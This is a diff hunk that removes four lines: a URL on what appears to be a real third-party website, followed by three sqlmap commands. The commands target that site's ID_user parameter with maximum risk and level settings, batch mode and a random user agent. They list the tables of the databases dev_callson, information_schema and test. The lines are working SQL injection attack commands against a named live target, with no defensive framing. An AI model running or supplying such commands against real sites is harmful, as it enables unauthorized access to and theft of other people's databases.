@@ -1,4 +1,0 @@
-http://wati.callson.fr/site.php?ID_user=10&href=http://www.symantec.com/page.jsp?id=seal-transition
-python ../sqlmap/sqlmap.py -u "http://wati.callson.fr/site.php?ID_user=10&href=http://www.symantec.com/page.jsp?id=seal-transition" --risk 3 --level 5 --batch --random-agent -D dev_callson --tables
-python ../sqlmap/sqlmap.py -u "http://wati.callson.fr/site.php?ID_user=10&href=http://www.symantec.com/page.jsp?id=seal-transition" --risk 3 --level 5 --batch --random-agent -D information_schema --tables
-python ../sqlmap/sqlmap.py -u "http://wati.callson.fr/site.php?ID_user=10&href=http://www.symantec.com/page.jsp?id=seal-transition" --risk 3 --level 5 --batch --random-agent -D test --tables
